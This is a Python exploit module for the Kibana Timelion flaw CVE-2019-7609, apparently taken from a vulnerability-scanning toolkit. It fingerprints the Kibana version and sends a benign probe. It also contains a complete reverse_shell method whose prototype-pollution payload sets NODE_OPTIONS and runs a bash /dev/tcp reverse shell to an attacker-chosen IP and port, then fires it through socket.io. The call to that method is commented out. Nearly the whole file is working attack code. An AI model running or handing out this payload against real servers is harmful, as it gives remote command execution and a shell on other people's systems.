#!/usr/bin/env python3

'''
name: CVE-2019-7609漏洞
description: CVE-2019-7609漏洞可执行任意命令,反弹shell
'''

import re
import time
import random
import binascii
from app.lib.utils.request import request


class CVE_2019_7609_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.version = '9.9.9'

    def get_kibana_version(self):
        headers = {
            'Referer': self.url,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
        }
        r = request.get(self.url+"/app/kibana", headers = headers)
        patterns = ['&quot;version&quot;:&quot;(.*?)&quot;,', '"version":"(.*?)",']
        for pattern in patterns:
            match = re.findall(pattern, r.text)
            if match:
                self.version = match[0]

    def version_compare(self, standard_version, compare_version):
        sc = standard_version.split(".")
        cc = compare_version.split(".")
        if len(sc) == 3 and len(cc) == 3:
            if sc[0].isdigit() and sc[1].isdigit() and sc[2].isdigit() and cc[0].isdigit() and cc[1].isdigit() and cc[2].isdigit():
                sc_value = 100 * int(sc[0]) + 10 * int(sc[1]) + int(sc[2])
                cc_value = 100 * int(cc[0]) + 10 * int(cc[1]) + int(cc[2])
                if sc_value > cc_value:
                    return True
        return False

    def reverse_shell(self, ip, port):
        random_name = "".join(random.sample('qwertyuiopasdfghjkl', 8))
        headers = {
            'Content-Type': 'application/json;charset=utf-8',
            'kbn-version': self.version,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
        }
        data = r'''{"sheet":[".es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"if [ ! -f /tmp/%s ];then touch /tmp/%s && /bin/bash -c \\'/bin/bash -i >& /dev/tcp/%s/%s 0>&1\\'; fi\");process.exit()//')\n.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')"],"time":{"from":"now-15m","to":"now","mode":"quick","interval":"10s","timezone":"Asia/Shanghai"}}''' % (random_name, random_name, ip, port)
        url = "{}{}".format(self.url, "/api/timelion/run")
        r1 = request.post(url, data = data, headers = headers)
        if r1.status_code == 200:
            trigger_url = self.url + "/socket.io/?EIO=3&transport=polling&t=MtjhZoM"
            new_headers = headers
            new_headers.update({'kbn-xsrf': 'professionally-crafted-string-of-text'})
            r2 = request.get(trigger_url, headers = new_headers)
            if r2.status_code == 200:
                time.sleep(5)
                return True
        return False

    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.get_kibana_version()
        if self.version == '9.9.9' or not self.version_compare("6.6.1", self.version):
            return False
        headers = {
            'Content-Type': 'application/json;charset=utf-8',
            'Referer': self.url,
            'kbn-version': self.version,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0',
        }
        data = '{"sheet":[".es(*)"],"time":{"from":"now-1m","to":"now","mode":"quick","interval":"auto","timezone":"Asia/Shanghai"}}'
        try:
            r = request.post(self.url + "/api/timelion/run", data = data, headers = headers)
            if r.status_code == 200 and 'application/json' in r.headers.get('content-type', '') and '"seriesList"' in r.text:
                print("存在CVE-2019-7609漏洞")
                #self.reverse_shell('127.0.0.1', '10000')
                return True
            else:
                print("不存在CVE-2019-7609漏洞")
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if __name__ == "__main__":
        CVE_2019_7609 = CVE_2019_7609_BaseVerify('http://192.168.30.242:5601')
        CVE_2019_7609.run()